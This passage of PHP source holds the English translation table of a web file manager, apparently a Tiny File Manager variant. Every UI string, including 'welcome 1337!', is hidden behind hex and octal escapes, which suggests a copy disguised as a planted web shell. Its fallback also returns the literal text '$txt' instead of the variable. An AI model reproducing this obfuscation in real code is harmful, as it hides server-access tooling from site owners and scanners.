    $tr["\x65\156"]["\x47\145\x6E\145\x72\141\x74\145"]       = "\x47\145\x6E\145\x72\141\x74\145";               $tr["\x65\156"]["\x46\165\x6C\154\x53\151\x7A\145"]           = "\x46\165\x6C\154\x20\123\x69\172\x65";              
    $tr["\x65\156"]["\x48\151\x64\145\x43\157\x6C\165\x6D\156\x73"]    = "\x48\151\x64\145\x20\120\x65\162\x6D\163\x2F\117\x77\156\x65\162\x20\143\x6F\154\x75\155\x6E\163";$tr["\x65\156"]["\x77\145\x6C\143\x6F\155\x65\040\x31\063\x33\067\x21"]     = "\x77\145\x6C\143\x6F\155\x65\040\x31\063\x33\067\x21";
    $tr["\x65\156"]["\x4E\157\x74\150\x69\156\x67\040\x73\145\x6C\145\x63\164\x65\144"]   = "\x4E\157\x74\150\x69\156\x67\040\x73\145\x6C\145\x63\164\x65\144";   $tr["\x65\156"]["\x50\141\x74\150\x73\040\x6D\165\x73\164\x20\142\x65\040\x6E\157\x74\040\x65\161\x75\141\x6C"]    = "\x50\141\x74\150\x73\040\x6D\165\x73\164\x20\142\x65\040\x6E\157\x74\040\x65\161\x75\141\x6C";
    $tr["\x65\156"]["\x52\145\x6E\141\x6D\145\x64\040\x66\162\x6F\155"]       = "\x52\145\x6E\141\x6D\145\x64\040\x66\162\x6F\155";       $tr["\x65\156"]["\x41\162\x63\150\x69\166\x65\040\x6E\157\x74\040\x75\156\x70\141\x63\153\x65\144"]       = "\x41\162\x63\150\x69\166\x65\040\x6E\157\x74\040\x75\156\x70\141\x63\153\x65\144";
    $tr["\x65\156"]["\x44\145\x6C\145\x74\145\x64"]            = "\x44\145\x6C\145\x74\145\x64";            $tr["\x65\156"]["\x41\162\x63\150\x69\166\x65\040\x6E\157\x74\040\x63\162\x65\141\x74\145\x64"]        = "\x41\162\x63\150\x69\166\x65\040\x6E\157\x74\040\x63\162\x65\141\x74\145\x64";
    $tr["\x65\156"]["\x43\157\x70\151\x65\144\x20\146\x72\157\x6D"]        = "\x43\157\x70\151\x65\144\x20\146\x72\157\x6D";        $tr["\x65\156"]["\x50\145\x72\155\x69\163\x73\151\x6F\156\x73\040\x63\150\x61\156\x67\145\x64"]        = "\x50\145\x72\155\x69\163\x73\151\x6F\156\x73\040\x63\150\x61\156\x67\145\x64";
    $tr["\x65\156"]["\x74\157"]                 = "\x74\157";                 $tr["\x65\156"]["\x53\141\x76\145\x64\040\x53\165\x63\143\x65\163\x73\146\x75\154\x6C\171"]         = "\x53\141\x76\145\x64\040\x53\165\x63\143\x65\163\x73\146\x75\154\x6C\171";
    $tr["\x65\156"]["\x6E\157\x74\040\x66\157\x75\156\x64\041"]         = "\x6E\157\x74\040\x66\157\x75\156\x64\041";         $tr["\x65\156"]["\x46\151\x6C\145\x20\123\x61\166\x65\144\x20\123\x75\143\x63\145\x73\163\x66\165\x6C\154\x79"]    = "\x46\151\x6C\145\x20\123\x61\166\x65\144\x20\123\x75\143\x63\145\x73\163\x66\165\x6C\154\x79";
    $tr["\x65\156"]["\x41\162\x63\150\x69\166\x65"]            = "\x41\162\x63\150\x69\166\x65";            $tr["\x65\156"]["\x50\145\x72\155\x69\163\x73\151\x6F\156\x73\040\x6E\157\x74\040\x63\150\x61\156\x67\145\x64"]    = "\x50\145\x72\155\x69\163\x73\151\x6F\156\x73\040\x6E\157\x74\040\x63\150\x61\156\x67\145\x64";
    $tr["\x65\156"]["\x53\145\x6C\145\x63\164\x20\146\x6F\154\x64\145\x72"]      = "\x53\145\x6C\145\x63\164\x20\146\x6F\154\x64\145\x72";      $tr["\x65\156"]["\x53\157\x75\162\x63\145\x20\160\x61\164\x68\040\x6E\157\x74\040\x64\145\x66\151\x6E\145\x64"]    = "\x53\157\x75\162\x63\145\x20\160\x61\164\x68\040\x6E\157\x74\040\x64\145\x66\151\x6E\145\x64";
    $tr["\x65\156"]["\x61\154\x72\145\x61\144\x79\040\x65\170\x69\163\x74\163"]     = "\x61\154\x72\145\x61\144\x79\040\x65\170\x69\163\x74\163";     $tr["\x65\156"]["\x45\162\x72\157\x72\040\x77\150\x69\154\x65\040\x6D\157\x76\151\x6E\147\x20\146\x72\157\x6D"]    = "\x45\162\x72\157\x72\040\x77\150\x69\154\x65\040\x6D\157\x76\151\x6E\147\x20\146\x72\157\x6D";
    $tr["\x65\156"]["\x43\162\x65\141\x74\145\x20\141\x72\143\x68\151\x76\145\x3F"]    = "\x43\162\x65\141\x74\145\x20\141\x72\143\x68\151\x76\145\x3F";    $tr["\x65\156"]["\x49\156\x76\141\x6C\151\x64\040\x66\151\x6C\145\x20\157\x72\040\x66\157\x6C\144\x65\162\x20\156\x61\155\x65"]    = "\x49\156\x76\141\x6C\151\x64\040\x66\151\x6C\145\x20\157\x72\040\x66\157\x6C\144\x65\162\x20\156\x61\155\x65";
    $tr["\x65\156"]["\x41\162\x63\150\x69\166\x65\040\x75\156\x70\141\x63\153\x65\144"]   = "\x41\162\x63\150\x69\166\x65\040\x75\156\x70\141\x63\153\x65\144";   $tr["\x65\156"]["\x46\151\x6C\145\x20\145\x78\164\x65\156\x73\151\x6F\156\x20\151\x73\040\x6E\157\x74\040\x61\154\x6C\157\x77\145\x64"]  = "\x46\151\x6C\145\x20\145\x78\164\x65\156\x73\151\x6F\156\x20\151\x73\040\x6E\157\x74\040\x61\154\x6C\157\x77\145\x64";
    $tr["\x65\156"]["\x52\157\x6F\164\x20\160\x61\164\x68"]          = "\x52\157\x6F\164\x20\160\x61\164\x68";          $tr["\x65\156"]["\x45\162\x72\157\x72\040\x77\150\x69\154\x65\040\x72\145\x6E\141\x6D\151\x6E\147\x20\146\x72\157\x6D"]  = "\x45\162\x72\157\x72\040\x77\150\x69\154\x65\040\x72\145\x6E\141\x6D\151\x6E\147\x20\146\x72\157\x6D";
    $tr["\x65\156"]["\x46\151\x6C\145\x20\156\x6F\164\x20\146\x6F\165\x6E\144"]     = "\x46\151\x6C\145\x20\156\x6F\164\x20\146\x6F\165\x6E\144";     $tr["\x65\156"]["\x45\162\x72\157\x72\040\x77\150\x69\154\x65\040\x64\145\x6C\145\x74\151\x6E\147\x20\151\x74\145\x6D\163"] = "\x45\162\x72\157\x72\040\x77\150\x69\154\x65\040\x64\145\x6C\145\x74\151\x6E\147\x20\151\x74\145\x6D\163";
    $tr["\x65\156"]["\x4D\157\x76\145\x64\040\x66\162\x6F\155"]         = "\x4D\157\x76\145\x64\040\x66\162\x6F\155";         $tr["\x65\156"]["\x47\145\x6E\145\x72\141\x74\145\x20\156\x65\167\x20\160\x61\163\x73\167\x6F\162\x64\040\x68\141\x73\150"] = "\x47\145\x6E\145\x72\141\x74\145\x20\156\x65\167\x20\160\x61\163\x73\167\x6F\162\x64\040\x68\141\x73\150";
    $tr["\x65\156"]["\x4C\157\x67\151\x6E\040\x66\141\x69\154\x65\144\x2E\040\x49\156\x76\141\x6C\151\x64\040\x75\163\x65\162\x6E\141\x6D\145\x20\157\x72\040\x70\141\x73\163\x77\157\x72\144"] = "\x4C\157\x67\151\x6E\040\x66\141\x69\154\x65\144\x2E\040\x49\156\x76\141\x6C\151\x64\040\x75\163\x65\162\x6E\141\x6D\145\x20\157\x72\040\x70\141\x73\163\x77\157\x72\144";
    $tr["\x65\156"]["\x70\141\x73\163\x77\157\x72\144\x5F\150\x61\163\x68\040\x6E\157\x74\040\x73\165\x70\160\x6F\162\x74\145\x64\054\x20\125\x70\147\x72\141\x64\145\x20\120\x48\120\x20\166\x65\162\x73\151\x6F\156"] = "\x70\141\x73\163\x77\157\x72\144\x5F\150\x61\163\x68\040\x6E\157\x74\040\x73\165\x70\160\x6F\162\x74\145\x64\054\x20\125\x70\147\x72\141\x64\145\x20\120\x48\120\x20\166\x65\162\x73\151\x6F\156";
    $tr["\x65\156"]["\x41\144\x76\141\x6E\143\x65\144\x20\123\x65\141\x72\143\x68"]    = "\x41\144\x76\141\x6E\143\x65\144\x20\123\x65\141\x72\143\x68";    $tr["\x65\156"]["\x45\162\x72\157\x72\040\x77\150\x69\154\x65\040\x63\157\x70\171\x69\156\x67\040\x66\162\x6F\155"]    = "\x45\162\x72\157\x72\040\x77\150\x69\154\x65\040\x63\157\x70\171\x69\156\x67\040\x66\162\x6F\155";
    $tr["\x65\156"]["\x49\156\x76\141\x6C\151\x64\040\x63\150\x61\162\x61\143\x74\145\x72\163\x20\151\x6E\040\x66\151\x6C\145\x20\156\x61\155\x65"]                = "\x49\156\x76\141\x6C\151\x64\040\x63\150\x61\162\x61\143\x74\145\x72\163\x20\151\x6E\040\x66\151\x6C\145\x20\156\x61\155\x65";
    $tr["\x65\156"]["\x46\111\x4C\105\x20\105\x58\124\x45\116\x53\111\x4F\116\x20\110\x41\123\x20\116\x4F\124\x20\123\x55\120\x50\117\x52\124\x45\104"]               = "\x46\111\x4C\105\x20\105\x58\124\x45\116\x53\111\x4F\116\x20\110\x41\123\x20\116\x4F\124\x20\123\x55\120\x50\117\x52\124\x45\104";
    $tr["\x65\156"]["\x53\145\x6C\145\x63\164\x65\144\x20\146\x69\154\x65\163\x20\141\x6E\144\x20\146\x6F\154\x64\145\x72\040\x64\145\x6C\145\x74\145\x64"]              = "\x53\145\x6C\145\x63\164\x65\144\x20\146\x69\154\x65\163\x20\141\x6E\144\x20\146\x6F\154\x64\145\x72\040\x64\145\x6C\145\x74\145\x64";
    $tr["\x65\156"]["\x45\162\x72\157\x72\040\x77\150\x69\154\x65\040\x66\145\x74\143\x68\151\x6E\147\x20\141\x72\143\x68\151\x76\145\x20\151\x6E\146\x6F"]              = "\x45\162\x72\157\x72\040\x77\150\x69\154\x65\040\x66\145\x74\143\x68\151\x6E\147\x20\141\x72\143\x68\151\x76\145\x20\151\x6E\146\x6F";
    $tr["\x65\156"]["\x44\145\x6C\145\x74\145\x20\163\x65\154\x65\143\x74\145\x64\040\x66\151\x6C\145\x73\040\x61\156\x64\040\x66\157\x6C\144\x65\162\x73\077"]             = "\x44\145\x6C\145\x74\145\x20\163\x65\154\x65\143\x74\145\x64\040\x66\151\x6C\145\x73\040\x61\156\x64\040\x66\157\x6C\144\x65\162\x73\077";
    $tr["\x65\156"]["\x53\145\x61\162\x63\150\x20\146\x69\154\x65\040\x69\156\x20\146\x6F\154\x64\145\x72\040\x61\156\x64\040\x73\165\x62\146\x6F\154\x64\145\x72\163\x2E\056\x2E"]        = "\x53\145\x61\162\x63\150\x20\146\x69\154\x65\040\x69\156\x20\146\x6F\154\x64\145\x72\040\x61\156\x64\040\x73\165\x62\146\x6F\154\x64\145\x72\163\x2E\056\x2E";
    $tr["\x65\156"]["\x41\143\x63\145\x73\163\x20\144\x65\156\x69\145\x64\056\x20\111\x50\040\x72\145\x73\164\x72\151\x63\164\x69\157\x6E\040\x61\160\x70\154\x69\143\x61\142\x6C\145"]       = "\x41\143\x63\145\x73\163\x20\144\x65\156\x69\145\x64\056\x20\111\x50\040\x72\145\x73\164\x72\151\x63\164\x69\157\x6E\040\x61\160\x70\154\x69\143\x61\142\x6C\145";
    $tr["\x65\156"]["\x49\156\x76\141\x6C\151\x64\040\x63\150\x61\162\x61\143\x74\145\x72\163\x20\151\x6E\040\x66\151\x6C\145\x20\157\x72\040\x66\157\x6C\144\x65\162\x20\156\x61\155\x65"]      = "\x49\156\x76\141\x6C\151\x64\040\x63\150\x61\162\x61\143\x74\145\x72\163\x20\151\x6E\040\x66\151\x6C\145\x20\157\x72\040\x66\157\x6C\144\x65\162\x20\156\x61\155\x65";
    $tr["\x65\156"]["\x4F\160\x65\162\x61\164\x69\157\x6E\163\x20\167\x69\164\x68\040\x61\162\x63\150\x69\166\x65\163\x20\141\x72\145\x20\156\x6F\164\x20\141\x76\141\x69\154\x61\142\x6C\145"]     = "\x4F\160\x65\162\x61\164\x69\157\x6E\163\x20\167\x69\164\x68\040\x61\162\x63\150\x69\166\x65\163\x20\141\x72\145\x20\156\x6F\164\x20\141\x76\141\x69\154\x61\142\x6C\145";
    $tr["\x65\156"]["\x46\151\x6C\145\x20\157\x72\040\x66\157\x6C\144\x65\162\x20\167\x69\164\x68\040\x74\150\x69\163\x20\160\x61\164\x68\040\x61\154\x72\145\x61\144\x79\040\x65\170\x69\163\x74\163"]   = "\x46\151\x6C\145\x20\157\x72\040\x66\157\x6C\144\x65\162\x20\167\x69\164\x68\040\x74\150\x69\163\x20\160\x61\164\x68\040\x61\154\x72\145\x61\144\x79\040\x65\170\x69\163\x74\163";

    $i18n = fm_get_translations($tr);
    $tr = $i18n ? $i18n : $tr;

    if (!strlen($lang)) $lang = "\x65\156";
    if (isset($tr[$lang][$txt])) return fm_enc($tr[$lang][$txt]);
    else if (isset($tr["\x65\156"][$txt])) return fm_enc($tr["\x65\156"][$txt]);
    else return "\x24\164\x78\164";
} ?>
